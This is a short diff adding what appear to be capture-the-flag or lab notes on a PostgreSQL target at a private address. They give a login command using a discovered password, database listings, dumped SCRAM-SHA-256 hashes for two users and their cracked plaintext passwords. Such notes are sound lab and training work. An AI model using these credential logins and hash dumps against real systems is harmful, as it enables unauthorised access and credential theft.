@@ -1,0 +1,26 @@
+postgres:Pikachu
+
+try the following:
+export PGPASSWORD=Pikachu
+psql -h 192.168.52.60 -U postgres -w
+
+                                             List of databases
+   Name    |  Owner   | Encoding  | Collate | Ctype | ICU Locale | Locale Provider |   Access privileges   
+-----------+----------+-----------+---------+-------+------------+-----------------+-----------------------
+ congrats  | postgres | SQL_ASCII | C       | C     |            | libc            | 
+ postgres  | postgres | SQL_ASCII | C       | C     |            | libc            | 
+ template0 | postgres | SQL_ASCII | C       | C     |            | libc            | =c/postgres          +
+           |          |           |         |       |            |                 | postgres=CTc/postgres
+ template1 | postgres | SQL_ASCII | C       | C     |            | libc            | =c/postgres          +
+           |          |           |         |       |            |                 | postgres=CTc/postgres
+(4 rows)
+
+ usename  |                                                                passwd                                                                 
+----------+---------------------------------------------------------------------------------------------------------------------------------------
+ postgres | SCRAM-SHA-256$4096:MDgohv40Wx8yQoFMKpOxog==$lZ9YvjLVuXBnP2ecRl1r4SBCfBvZuOC4aRrfJPVQucY=:ZnY7g7OaJluxCHmTLAxvy1dBx3SiT651APxsdjDvWiA=
+ brock    | SCRAM-SHA-256$4096:u8++VWq/sGy0uPbINvQebw==$qZ/0RuVr0QFuZ+8gz2O1nZ8KqlqiC+lxU3wRXomYUWc=:Cz0gCJ8mr4NbtRPzsqYox/Cjkz0zVdSG+rIU8cS9IhA=
+(2 rows)
+
+crackedhashes:
+postgres:Pikachu
+brock:Geodude
